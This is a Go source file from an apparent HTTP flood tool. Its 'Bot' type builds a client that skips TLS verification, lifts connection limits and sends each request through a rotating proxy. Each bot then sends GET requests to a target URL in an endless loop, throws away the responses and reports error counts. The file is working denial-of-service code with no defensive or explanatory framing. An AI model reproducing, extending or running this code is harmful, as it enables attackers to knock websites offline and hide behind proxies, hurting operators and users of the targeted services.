package flood

import (
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"runtime"
	"strings"
)

type (
	BotResp struct {
		ID       int
		Err      error
		ErrCount int
		Continue chan<- bool
	}

	Bot struct {
		id int
		c  *http.Client
	}
)

func NewBot(id int, getProxy func() *Proxy) (*Bot, error) {
	// TODO: adjust constants
	tr := http.DefaultTransport.(*http.Transport).Clone()
	tr.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	tr.MaxIdleConns = 10   // 0 - no limit
	tr.MaxConnsPerHost = 0 // 0 - no limit
	tr.IdleConnTimeout = DIAL_TIMEOUT
	tr.DisableCompression = true
	tr.DisableKeepAlives = true

	tr.Dial = (&net.Dialer{
		Timeout: DIAL_TIMEOUT,
	}).Dial

	tr.Proxy = func(req *http.Request) (*url.URL, error) {
		proxy := getProxy()
		if proxy == nil {
			// log.WithField("id", id).Println("Надсилаю без проксі")
			return nil, nil
		}

		url, err := url.Parse(proxy.IP)

		if err != nil {
			url, err = url.Parse(req.URL.Scheme + proxy.IP)
			if err != nil {
				return nil, err
			}
		}
		a := strings.Split(proxy.Auth, ":")
		if len(a) > 2 {
			req.SetBasicAuth(a[0], a[1])
		}

		return url, nil
	}

	b := &Bot{
		id: id,
		c:  &http.Client{Transport: tr, Timeout: DIAL_TIMEOUT},
	}

	return b, nil
}

func (b *Bot) Start(ctx context.Context, target string, msgs chan<- BotResp) {
	cont := make(chan bool, 1)
	errCount := 0
	for {
		select {
		case <-ctx.Done():
			return
		default:
			req, err := newReq(ctx, "GET", target)
			switch {
			case err != nil:
				errCount++
				err = fmt.Errorf("Під час створення запиту: %v", err)
			default:
				var resp *http.Response
				switch resp, err = b.c.Do(req); {
				case err != nil:
					errCount++
					if resp != nil {
						err = fmt.Errorf("%v (%d %s)", err, resp.StatusCode, http.StatusText(resp.StatusCode))
					}
				default:
					if resp.StatusCode != http.StatusOK {
						errCount++
						err = fmt.Errorf("%d %s", resp.StatusCode, http.StatusText(resp.StatusCode))
					}
					toDevNull(resp.Body)
				}
			}

			select {
			case <-ctx.Done():
				return
			case msgs <- BotResp{ID: b.id, Err: err, Continue: cont, ErrCount: errCount}:
				select {
				case <-ctx.Done():
					return
				case v := <-cont:
					if !v {
						return
					}
				}
			}
		}
		runtime.Gosched()
	}
}
